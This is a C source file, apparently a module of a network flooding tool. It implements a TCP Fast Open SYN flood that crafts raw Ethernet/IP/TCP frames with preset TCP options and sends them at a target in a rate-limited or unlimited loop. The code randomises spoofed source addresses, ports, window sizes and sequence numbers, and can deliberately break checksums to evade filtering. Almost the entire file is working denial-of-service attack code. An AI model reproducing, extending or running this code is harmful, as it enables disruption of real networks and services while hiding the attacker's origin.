#include "../../include/methods.h"

static struct tcphdr		*tcp;
static struct iphdr		*ip;
static u_char			frame[65535];
static u_char			ctos[3]={0, 40, 72};
static u_short			windows[3]={29200, 64535, 65535};

static void inline for_iteration(method_args_t *a)
{
	u_char stronka[]="\x02\x04\x05\xb4\x04\x02\x08\x0a\x00"
		"\xd9\x68\xa3\x00\x00\x00\x00\x01\x03\x03\x07"
		"\xfe\x04\xf9\x89\x00\x00\x00\x00\x00\x00\x00\x00";

	ip->id=htons(random_u16());
	ip->tos=ctos[randnum(0, 2)];

	stronka[2]=randnum(4, 5);
	stronka[3]=stronka[2]==5?randnum(1, 180):randnum(1, 250);
	stronka[7]=10;
	stronka[8]=randnum(1, 250);
	stronka[17]=3;
	stronka[18]=3;
	stronka[19]=randnum(6, 9);
	stronka[20]=34;
	stronka[21]=2;
	stronka[22]=1;
	stronka[23]=1;

	memcpy((frame+14+(sizeof(struct tcphdr)+sizeof(struct iphdr)+24)),
		stronka,(sizeof(stronka)));

	if (a->o->OPT_SOURCE[0]=='\a')
		ip->saddr=random_ipv4();

	ip->tot_len=htons((sizeof(struct iphdr)+
		sizeof(struct tcphdr)+24+sizeof(stronka)));
	tcp->seq=htonl(random_u32());
	tcp->window=htons(windows[randnum(0, 2)]);

	tcp->dest=(a->o->OPT_DSTPORT==ARANDVAL)?
		htons(random_u16()):htons(a->o->OPT_DSTPORT);
	tcp->source=(a->o->OPT_SRCPORT==ARANDVAL)?
		htons(random_u16()):htons(a->o->OPT_SRCPORT);

	tcp->check=0;
	tcp->check=ip4_pseudocheck(ip->saddr, ip->daddr,
		IPPROTO_TCP, sizeof(struct tcphdr)+
		24+sizeof(stronka), tcp);

	if (a->o->OPT_BADSUM==ARANDVAL) {
		if (randnum(0,1)==0)
			--tcp->check;
	}
	else if (a->o->OPT_BADSUM==1)
		--tcp->check;

	ip->check=0;
	ip->check=in_check((u_short*)ip,sizeof(*ip));
}

void tcp_tfo_flood(method_args_t *a)
{
	memset(frame,0,sizeof(frame));
	memcpy(frame,a->machdr,14);
	ip=(struct iphdr*)(frame+14);
	tcp=(struct tcphdr*)(frame+14+(sizeof(struct iphdr)));

	ip->ihl=5;
	ip->version=4;
	ip->tos=0;
	ip->ttl=100;
	ip->frag_off=htons(0x4000);
	ip->protocol=IPPROTO_TCP;
	ip->saddr=a->source;
	ip->daddr=a->target;
	tcp->syn=1;
	memcpy((frame+14+(sizeof(struct tcphdr)+sizeof(struct iphdr))), /* opts */
		"\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xd9\x68\xa3"
		"\x00\x00\x00\x00\x01\x03\x03\x07\xfe\x04\xf9\x89", 24);
	tcp->doff=((sizeof(struct tcphdr))+24)/4;

	FLOODRUN(a,for_iteration(a),ethsend(a->fd,frame,ntohs(ip->tot_len)+14),
		a->o->OPT_PPS,a->o->OPT_TIME,a->o->OPT_UNLIMIT);
}
